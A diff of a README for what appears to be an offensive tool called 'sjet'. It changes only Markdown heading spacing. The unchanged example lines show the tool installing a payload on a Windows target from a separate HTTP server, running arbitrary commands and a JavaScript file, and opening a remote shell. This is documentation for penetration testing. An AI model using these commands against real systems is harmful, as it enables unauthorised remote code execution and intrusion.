@@ -37,7 +37,7 @@ Explain how to run the automated tests for this system
 ## Example
 
 
-###Installing the payload in a Windows target:
+### Installing the payload in a Windows target:
 
 ```
 Patricios-MacBook-Pro:sjet preller$ Jython sjet.py 192.168.56.101 8008 install http://192.168.56.1 8888
@@ -54,7 +54,7 @@ Patricios-MacBook-Pro:sjet preller$ Jython sjet.py 192.168.56.101 8008 install h
 Patricios-MacBook-Pro:sjet preller$
 ```
 
-###Running the command 'dir' in a Windows target:
+### Running the command 'dir' in a Windows target:
 
 ```
 Patricios-MacBook-Pro:sjet preller$ Jython sjet.py 192.168.56.101 8008 command "dir"
@@ -92,7 +92,7 @@ Patricios-MacBook-Pro:sjet preller$ Jython sjet.py 192.168.56.101 8008 command "
 Patricios-MacBook-Pro:sjet preller$
 ```
 
-###Running the file poc.js in a Windows target:
+### Running the file poc.js in a Windows target:
 
 ```
 Patricios-MacBook-Pro:sjet preller$ Jython sjet.py 192.168.56.101 8008 javascript "poc.js"
@@ -105,7 +105,7 @@ None
 
 Patricios-MacBook-Pro:sjet preller$
 ```
-###Running ping in shell mode in a Windows target:
+### Running ping in shell mode in a Windows target:
 
 ```
 Patricios-MacBook-Pro:sjet preller$ Jython sjet.py 192.168.56.101 8008 shell
